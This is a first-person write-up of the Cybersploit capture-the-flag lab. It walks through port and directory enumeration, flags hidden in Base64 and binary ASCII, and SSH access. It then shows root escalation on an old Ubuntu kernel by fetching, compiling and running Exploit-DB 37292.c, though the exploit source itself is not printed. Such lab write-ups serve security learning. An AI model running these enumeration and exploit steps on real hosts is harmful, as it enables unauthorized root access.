# Cybersploit CTF — Complete Exploitation Walkthrough

**Date:** 9 September 2026  
**Lab:** Cybersploit CTF  
**Target:** `192.168.29.206`  
**Attacker:** Kali Linux  
**Initial User:** `itsskv`  
**Final Privilege:** `root`

> **Lab note:** This walkthrough documents my work in an authorized CTF/lab environment. The techniques should only be used on systems I have permission to test.

---

## 1. Overview

Today I completed the **Cybersploit CTF**. The objective was to enumerate the target, gain initial access, find the flags, and finally escalate privileges to `root`.

The overall attack path was:

```text
Target Discovery
      ↓
Nmap Enumeration
      ↓
Web Enumeration
      ↓
HTML Source → Username
      ↓
robots.txt → Base64 → Flag 1
      ↓
SSH Access
      ↓
flag2.txt → Binary/ASCII → Flag 2
      ↓
Linux Enumeration
      ↓
Old Ubuntu + Kernel
      ↓
Kernel Exploit
      ↓
Root Access
      ↓
/root/finalflag.txt → Flag 3
```

---

# 2. Target Discovery

I first identified the target on my local CTF network:

```text
192.168.29.206
```

The MAC address was:

```text
08:00:27:56:1A:0C
```

The vendor was identified as:

```text
Oracle VirtualBox virtual NIC
```

This was a useful clue that the target was likely a VirtualBox VM.

---

# 3. Nmap Enumeration

I scanned the target with:

```bash
nmap -A -sV 192.168.29.206
```

Important results:

```text
22/tcp open  ssh   OpenSSH 5.9p1 Debian 5ubuntu1.10
80/tcp open  http  Apache httpd 2.2.22 (Ubuntu)
```

The HTTP title was:

```text
Hello Pentester!
```

### What I learned

`-sV` performs service/version detection.

For example:

```text
80/tcp open http
```

becomes:

```text
80/tcp open http Apache 2.2.22
```

This gives more information about what software is running.

`-A` enables several advanced detection features, including OS and version detection, scripts, and traceroute.

---

# 4. Web Server Enumeration

Since port 80 was open, I investigated the website:

```bash
curl -i http://192.168.29.206/
```

The page contained:

```html
<h1>Welcome To CyBeRSplOiT-CTF </h1>
```

It also contained a hidden HTML comment:

```html
<!-------------username:itsskv--------------------->
```

This gave me:

```text
Username: itsskv
```

### Why this mattered

A username alone is not enough to log in, but SSH was already open on port 22.

So I kept the username for later and continued web enumeration.

---

# 5. Directory Enumeration with Gobuster

I ran:

```bash
gobuster dir -u http://192.168.29.206 -w /usr/share/wordlists/dirb/common.txt
```

Interesting results included:

```text
hacker       (Status: 200)
index        (Status: 200)
index.html   (Status: 200)
robots       (Status: 200)
robots.txt   (Status: 200)
```

The most interesting result was:

```text
robots.txt
```

---

# 6. robots.txt and Base64

I requested it:

```bash
curl -i http://192.168.29.206/robots.txt
```

The response contained:

```text
R29vZCBXb3JrICEKRmxhZzE6IGN5YmVyc3Bsb2l0e3lvdXR1YmUuY29tL2MvY3liZXJzcGxvaXR9
```

This looked like Base64.

I decoded it:

```bash
echo 'R29vZCBXb3JrICEKRmxhZzE6IGN5YmVyc3Bsb2l0e3lvdXR1YmUuY29tL2MvY3liZXJzcGxvaXR9' | base64 -d
```

Output:

```text
Good Work !
Flag1: cybersploit{youtube.com/c/cybersploit}
```

## Flag 1

```text
cybersploit{youtube.com/c/cybersploit}
```

### What is Base64?

Base64 is an **encoding**, not encryption.

It represents data using characters such as:

```text
A-Z
a-z
0-9
+
/
```

When I see an unusual string with this type of character set, Base64 is one thing I should consider.

---

# 7. Investigating `/hacker`

Gobuster also found:

```text
/hacker
```

with a size of approximately 3.7 MB.

I checked its headers:

```bash
curl -I http://192.168.29.206/hacker
```

Important results:

```text
Content-Location: hacker.gif
Content-Type: image/gif
```

So `/hacker` was actually serving an animated GIF.

I downloaded it:

```bash
wget http://192.168.29.206/hacker -O hacker.gif
```

I inspected it using:

```bash
exiftool hacker.gif
```

Important information:

```text
File Type      : GIF
Image Width    : 480
Image Height   : 480
Frame Count    : 42
Duration       : 1.41 s
```

I also checked it with:

```bash
strings hacker.gif
```

There was no obvious flag or password in the readable strings.

I ran:

```bash
binwalk hacker.gif
```

It reported a JBOOT signature, but the claimed embedded size was unrealistic compared with the actual GIF size, so I treated it as a likely false positive rather than blindly following it.

### Lesson

Tools are helpful, but their results still need to make sense.

---

# 8. SSH Enumeration and Access

I already had:

```text
Username: itsskv
SSH: port 22
```

I tested SSH:

```bash
ssh -v itsskv@192.168.29.206
```

The verbose output showed:

```text
Authentications that can continue: publickey,password
```

This confirmed that password authentication was enabled.

I eventually obtained SSH access as:

```text
itsskv@cybersploit-CTF
```

---

# 9. Initial Access Enumeration

After logging in, I checked my identity:

```bash
whoami
```

Result:

```text
itsskv
```

I checked my current directory:

```bash
pwd
```

Result:

```text
/home/itsskv
```

I checked my UID and groups:

```bash
id
```

Result:

```text
uid=1001(itsskv) gid=1001(itsskv) groups=1001(itsskv)
```

This confirmed that I was a normal, low-privileged user.

---

# 10. Flag 2

I listed my home directory and found:

```text
flag2.txt
```

I read it:

```bash
cat flag2.txt
```

The file contained groups of 8 binary digits, for example:

```text
01100111
01101111
01101111
```

This represented characters using binary ASCII.

I decoded it with Python:

```bash
python3 -c "s=open('flag2.txt').read(); print(''.join(chr(int(x,2) for x in s.split()))"
```

The intended decoding was:

```bash
python3 -c "s=open('flag2.txt').read(); print(''.join(chr(int(x,2)) for x in s.split()))"
```

The output was:

```text
good work !
flag2: cybersploit{https:t.me/cybersploit1}
```

## Flag 2

```text
cybersploit{https:t.me/cybersploit1}
```

### What I learned

Each group contains 8 bits.

For example:

```text
01100111
```

is binary for decimal:

```text
103
```

ASCII character 103 is:

```text
g
```

So the process was:

```text
Binary → Decimal → ASCII character
```

---

# 11. Checking Sudo

I checked whether my user had sudo privileges:

```bash
sudo -l
```

The result was:

```text
Sorry, user itsskv may not run sudo on cybersploit-CTF.
```

Therefore:

```text
sudo → Not available
```

I needed another privilege escalation path.

---

# 12. Enumerating Other Users

I checked:

```bash
cat /etc/passwd
```

I found another normal-looking user:

```text
cybersploit:x:1000:1000:...:/home/cybersploit:/bin/bash
```

My account was:

```text
itsskv:x:1001:1001:...:/home/itsskv:/bin/bash
```

I checked the other user's home directory:

```bash
ls -la /home/cybersploit
```

Most hidden directories were protected with permissions such as:

```text
drwx------
```

so I could not access their private contents.

One interesting readable file was:

```text
/home/cybersploit/get-docker.sh
```

I did not assume it was the intended exploit without further evidence.

---

# 13. Operating System and Kernel Enumeration

I checked the kernel:

```bash
uname -a
```

Result:

```text
Linux cybersploit-CTF 3.13.0-32-generic #57~precise1-Ubuntu SMP Tue Jul 15 03:50:54 UTC 2014 i686 athlon i386 GNU/Linux
```

I checked the operating system:

```bash
cat /etc/os-release
```

Result:

```text
NAME="Ubuntu"
VERSION="12.04.5 LTS, Precise Pangolin"
ID=ubuntu
VERSION_ID="12.04"
```

So the target was running:

```text
Ubuntu 12.04.5 LTS
Kernel: 3.13.0-32-generic
Architecture: i686 / 32-bit
```

This was a major clue because the system was extremely old.

---

# 14. SUID Enumeration

I searched for SUID files:

```bash
find / -perm -4000 -type f 2>/dev/null
```

I found several standard SUID programs, including:

```text
/bin/su
/bin/mount
/bin/umount
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/pkexec
...
```

There was no obvious custom SUID binary that immediately provided an easy escalation path.

The old kernel therefore became more interesting.

---

# 15. Kernel Exploit

I obtained an Exploit-DB source file:

```text
37292.c
```

The exploit source was initially on Kali.

My Kali IP was:

```text
192.168.29.168
```

The target was:

```text
192.168.29.206
```

The important transfer concept was:

```text
Kali
192.168.29.168
      |
      | HTTP
      ↓
Cybersploit VM
192.168.29.206
```

I transferred the source file to the target and stored it at:

```text
/tmp/37292.c
```

---

# 16. A Transfer Mistake I Made

At one point I tried:

```bash
wget http://192.168.29.206:8000/37292.c
```

from the target.

This failed because:

```text
192.168.29.206 = target
192.168.29.168 = Kali
```

I was trying to connect to the target itself on port 8000 instead of connecting back to Kali.

The correct idea was:

```text
Kali → serve file
Target → download file
```

I later successfully transferred the file.

---

# 17. Compiling the Exploit

The target already had GCC:

```bash
gcc --version
```

It reported:

```text
gcc (Ubuntu/Linaro 4.6.3-1ubuntu5) 4.6.3
```

I compiled the source:

```bash
gcc 37292.c -o exploit
```

Compilation completed successfully.

The executable was created:

```text
/tmp/exploit
```

I verified it:

```bash
ls -l exploit
```

---

# 18. Privilege Escalation

I executed the compiled exploit:

```bash
./exploit
```

The output included:

```text
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
```

The exploit then gave me a shell.

I checked:

```bash
whoami
```

Result:

```text
root
```

I also checked:

```bash
id
```

Result:

```text
uid=0(root) gid=0(root) groups=0(root),1001(itsskv)
```

This confirmed successful privilege escalation.

---

# 19. Understanding the Privilege Escalation

The exploit output contained this important line:

```text
/etc/ld.so.preload created
```

`/etc/ld.so.preload` can tell the dynamic linker to load a shared library automatically.

In this lab, the kernel vulnerability was abused to create/use this mechanism so that attacker-controlled code could execute with elevated privileges.

The conceptual chain was:

```text
Low-privileged user
        ↓
Vulnerable kernel
        ↓
Privilege escalation
        ↓
Malicious shared library
        ↓
/etc/ld.so.preload
        ↓
Elevated execution
        ↓
root shell
```

The important lesson is not to memorize one exploit command.

The important lesson is to understand that:

> An outdated kernel can contain vulnerabilities that allow a normal local user to cross the privilege boundary and become root.

---

# 20. Finding the Final Flag

Once I was root, I searched for files named `flag`:

```bash
find / -name "flag*" -type f 2>/dev/null
```

The output contained many normal Linux files with "flag" in their names, so the result was noisy.

I checked the root directory:

```bash
ls -la /root
```

I found:

```text
finalflag.txt
```

The complete path was:

```text
/root/finalflag.txt
```

I read it:

```bash
cat /root/finalflag.txt
```

The important line was:

```text
flag3: cybersploit{Z3X21CW42C4 many many congratulations !}
```

## Flag 3

```text
cybersploit{Z3X21CW42C4}
```

---

# 21. Final Flags

## Flag 1

```text
cybersploit{youtube.com/c/cybersploit}
```

## Flag 2

```text
cybersploit{https:t.me/cybersploit1}
```

## Flag 3

```text
cybersploit{Z3X21CW42C4}
```

---

# 22. Complete Attack Chain

```text
                    Cybersploit CTF
                           |
                           ↓
                   Target Discovery
                           |
                           ↓
                  192.168.29.206
                           |
                           ↓
                     Nmap Scan
                           |
                 ┌─────────┴─────────┐
                 ↓                   ↓
              SSH :22             HTTP :80
                                     |
                                     ↓
                              Web Enumeration
                                     |
                                     ↓
                              HTML Source
                                     |
                                     ↓
                           username: itsskv
                                     |
                                     ↓
                                  Gobuster
                                     |
                                     ↓
                                robots.txt
                                     |
                                     ↓
                               Base64 decode
                                     |
                                     ↓
                                  Flag 1
                                     |
                                     ↓
                              SSH Access
                                     |
                                     ↓
                               itsskv user
                                     |
                                     ↓
                                flag2.txt
                                     |
                                     ↓
                              Binary → ASCII
                                     |
                                     ↓
                                  Flag 2
                                     |
                                     ↓
                           Linux Enumeration
                                     |
                                     ↓
                            Old kernel found
                                     |
                                     ↓
                            Ubuntu 12.04.5
                            Kernel 3.13.0-32
                                     |
                                     ↓
                             Kernel Exploit
                                37292.c
                                     |
                                     ↓
                               Root Access
                                     |
                                     ↓
                           /root/finalflag.txt
                                     |
                                     ↓
                                  Flag 3
```

---

# 23. Tools Used

| Tool | Purpose |
|---|---|
| `nmap` | Port, service, and OS enumeration |
| `curl` | Requesting and inspecting web resources |
| `gobuster` | Directory/file enumeration |
| `base64` | Base64 decoding |
| `ssh` | Remote shell access |
| `cat` | Reading files |
| `find` | Searching the filesystem |
| `uname` | Kernel/system information |
| `exiftool` | GIF metadata inspection |
| `binwalk` | Checking for embedded signatures |
| `strings` | Searching binary files for readable strings |
| `gcc` | Compiling the exploit |
| `wget` | Transferring files |

---

# 24. Key Concepts I Learned

### Reconnaissance

Before exploitation, I need to understand the target:

```text
What is the IP?
What ports are open?
What services are running?
What versions are running?
What OS is being used?
```

---

### Enumeration

Enumeration goes deeper than simply finding open ports.

For HTTP, I investigated:

```text
Web page
HTML source
Comments
robots.txt
Directories
Files
```

---

### Source Code Comments

The username was hidden in an HTML comment.

This taught me to inspect source code instead of relying only on what is visibly displayed in the browser.

---

### Encoding

I encountered:

```text
Flag 1 → Base64
Flag 2 → Binary/ASCII
```

I should always distinguish encoding from encryption.

---

### SSH

SSH provides remote command-line access.

In this lab:

```text
Port → 22
User → itsskv
```

---

### Linux Privilege Escalation

After gaining a normal user shell, I checked:

```text
whoami
id
sudo -l
users
SUID binaries
OS version
Kernel version
```

This helped me identify the privilege-escalation path.

---

### SUID

SUID programs can execute with the permissions of their owner.

That makes SUID enumeration important:

```bash
find / -perm -4000 -type f 2>/dev/null
```

But not every SUID program is vulnerable.

---

### Kernel Enumeration

The exact kernel version matters when researching local privilege-escalation vulnerabilities.

I found:

```text
Ubuntu 12.04.5
Kernel 3.13.0-32-generic
i686
```

That information helped identify an appropriate escalation path for this intentionally vulnerable lab.

---

# 25. Mistakes and Lessons

## Mistake 1 — Wrong IP during file transfer

I tried downloading the exploit from:

```text
192.168.29.206
```

while already inside that machine.

The lesson:

```text
192.168.29.206 → target
192.168.29.168 → Kali
```

Always know which machine is serving and which machine is receiving.

---

## Mistake 2 — Treating binary data as text

I requested the GIF with `curl` and received unreadable characters.

That happened because a GIF is binary data.

The better approach was:

```text
Download → identify → inspect
```

---

## Mistake 3 — Trusting tool output blindly

`binwalk` produced a JBOOT signature, but the reported size did not make sense.

The lesson:

> Tools can produce false positives. Always verify whether a finding is logically possible.

---

# 26. Methodology I Want to Remember

When I face another Linux CTF, I want to follow this general process:

```text
1. Identify target
2. Scan ports
3. Identify services
4. Enumerate each service
5. Look for usernames/files/clues
6. Gain initial access
7. Identify current privileges
8. Enumerate the local system
9. Check sudo/SUID/capabilities/processes/cron/etc.
10. Identify the actual vulnerability
11. Verify the exploit matches the environment
12. Perform privilege escalation
13. Verify root access
14. Locate the final flag
15. Document what I learned
```

The most important part is:

```text
Enumerate → Understand → Verify → Exploit
```

not:

```text
Find exploit → Run blindly
```

---

# 27. Final Reflection

This CTF taught me that exploitation is not just about running an exploit.

A large part of the work was:

```text
Looking
Reading
Enumerating
Recognizing patterns
Following clues
Understanding the system
```

The target gradually gave me information:

```text
HTML comment
    ↓
username

robots.txt
    ↓
Base64
    ↓
Flag 1

SSH
    ↓
itsskv

flag2.txt
    ↓
Binary
    ↓
Flag 2

System enumeration
    ↓
Old Ubuntu/kernel

Kernel exploit
    ↓
root

/root/finalflag.txt
    ↓
Flag 3
```

### Main takeaway

> **Don't rush to exploit. Enumerate first, understand what you found, and let the information guide the next step.**

This is the mindset I want to continue developing throughout my cybersecurity journey.
